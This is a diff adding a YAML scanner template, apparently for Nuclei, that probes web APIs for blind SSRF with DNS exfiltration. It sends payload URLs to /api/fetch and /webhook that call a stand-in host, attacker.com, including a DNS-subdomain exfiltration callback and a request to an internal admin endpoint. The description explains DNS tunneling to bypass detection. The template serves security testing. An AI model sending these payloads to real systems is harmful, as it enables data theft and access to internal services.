@@ -1,0 +1,76 @@
+id: custom-2026-exfil-004
+info:
+  name: Blind SSRF via DNS Exfiltration - Out-of-Band Data Retrieval
+  author: SecurityTeam
+  severity: high
+  description: |
+    Exfiltrates data via blind SSRF using DNS queries:
+    1. Inject payload that triggers SSRF
+    2. Server makes DNS query with data as subdomain
+    3. Attacker captures DNS query logs
+    4. Extract exfiltrated data from DNS query
+    5. Bypass network detection via DNS tunneling
+    
+    Detection method:
+    - Attempt SSRF with DNS callback URLs
+    - Monitor response times (indicates DNS resolution attempt)
+    - Check for DNS error messages
+    - Test data encoding in DNS queries
+  
+  reference:
+    - https://www.acunetix.com/blog/articles/dns-exfiltration-techniques/
+
+requests:
+  - method: POST
+    path: /api/fetch
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "url": "http://attacker.com:8080/data"
+      }
+    
+    matchers:
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "error"
+          - "blocked"
+
+  - method: POST
+    path: /api/fetch
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "url": "http://internal-server.local:8000/admin/users"
+      }
+    
+    matchers:
+      - type: dsl
+        expressions:
+          # Blind SSRF: No response body but request is processed
+          - 'status == 200 AND response_size < 100'
+        condition: all
+
+  - method: POST
+    path: /webhook
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "callback_url": "http://{{exfil_dns}}.attacker.com/callback"
+      }
+    
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'processed|success|queued'
+
+tags:
+  - exfiltration
+  - ssrf
+  - dns-tunneling
+  - out-of-band
